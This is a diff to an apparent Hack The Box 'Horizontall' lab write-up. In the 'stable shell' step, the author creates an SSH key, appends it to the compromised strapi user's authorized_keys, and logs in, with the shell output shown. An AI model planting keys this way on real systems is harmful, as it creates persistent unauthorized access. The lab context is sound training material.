@@ -148,11 +148,55 @@ tcp  LISTEN 0      80                                      127.0.0.1:3306       
 
 > GETTING STABLE SHELL
 
-![image](https://github.com/jon-brandy/hackthebox/assets/70703371/764248db-8ef2-45db-84af-26e585559d62)
+```
+Run ssh-keygen and name it strapi. Leave passphrase as empty.
+```
+
+```
+┌──(brandy㉿bread-yolk)-[~/.ssh]
+└─$ cat strapi.pub 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSkKa41/gSzdACeUnS4LSdFy+gzYMir6uj0QrPc07On9isAO7mHK2ATZRW4bbHqVQCU7Wf5JPvcGuW+iOq2+R/ker3onDvd0OcY9yxvGJrjPqeMtDeENRNuKA/XftHIkkZR1mql8QG9I7Vfd/T/Cy5NBvsg/2/UuualNHQqXMGAGPtIVqDz/PWDY7n+0+ZX4eEDdDth85Cn6DgRPXou1W/v4dgga2jJp6Ud7JlITWNXVnibacxvmPaQ90na5GMULAkhQMSCCT5c8iiTAT5Q0h4JLjWedwRJXADizCpNtZ+CNKYqbcvXTG/yK+0I/2t37/Zk65ZAcRc2XjqOAzkS2IcIZpP8rTtrho1ep0jHwdavwVrjXoQg7KPiJPdKPoLcOPo+Ov14NgkfT6+jFMGj2B5+5zMhHCMEVsG54ww6l4RZ3wwoObFfW9/CVIzKunTBLqRRWgezYl2BkelwhwEjHzLfYhOJVxmycfry5JBJD/KvfLXVztuUVpwnRLgDcIcHJ0= brandy@bread-yolk
+```
+
+```
+Then store the content of strapi.pub to /.ssh/authorized_keys at the target machine.
+
+strapi@horizontall:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSkKa41/gSzdACeUnS4LSdFy+gzYMir6uj0QrPc07On9isAO7mHK2ATZRW4bbHqVQCU7Wf5JPvcGuW+iOq2+R/ker3onDvd0OcY9yxvGJrjPqeMtDeENRNuKA/XftHIkkZR1mql8QG9I7Vfd/T/Cy5NBvsg/2/UuualNHQqXMGAGPtIVqDz/PWDY7n+0+ZX4eEDdDth85Cn6DgRPXou1W/v4dgga2jJp6Ud7JlITWNXVnibacxvmPaQ90na5GMULAkhQMSCCT5c8iiTAT5Q0h4JLjWedwRJXADizCpNtZ+CNKYqbcvXTG/yK+0I/2t37/Zk65ZAcRc2XjqOAzkS2IcIZpP8rTtrho1ep0jHwdavwVrjXoQg7KPiJPdKPoLcOPo+Ov14NgkfT6+jFMGj2B5+5zMhHCMEVsG54ww6l4RZ3wwoObFfW9/CVIzKunTBLqRRWgezYl2BkelwhwEjHzLfYhOJVxmycfry5JBJD/KvfLXVztuUVpwnRLgDcIcHJ0= brandy@bread-yolk" >> authorized_keys
+<wnRLgDcIcHJ0= brandy@bread-yolk" >> authorized_keys
+```
+
+```
+Lastly we can run --> ssh -i strapi strapi@horizontall.htb to get the stable shell
+```
+
+```
+┌──(brandy㉿bread-yolk)-[~/.ssh]
+└─$ ssh -i strapi strapi@horizontall.htb          
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Sep 14 15:46:39 UTC 2023
+
+  System load:  0.04              Processes:           177
+  Usage of /:   83.3% of 4.85GB   Users logged in:     0
+  Memory usage: 28%               IP address for eth0: 10.10.11.105
+  Swap usage:   0%
 
 
-![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2ee037a7-b025-4453-8f8e-4346a42eec75)
+0 updates can be applied immediately.
 
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+Last login: Fri Jun  4 11:29:42 2021 from 192.168.1.15
+$ whoami
+strapi
+$ 
+```
 
 
 
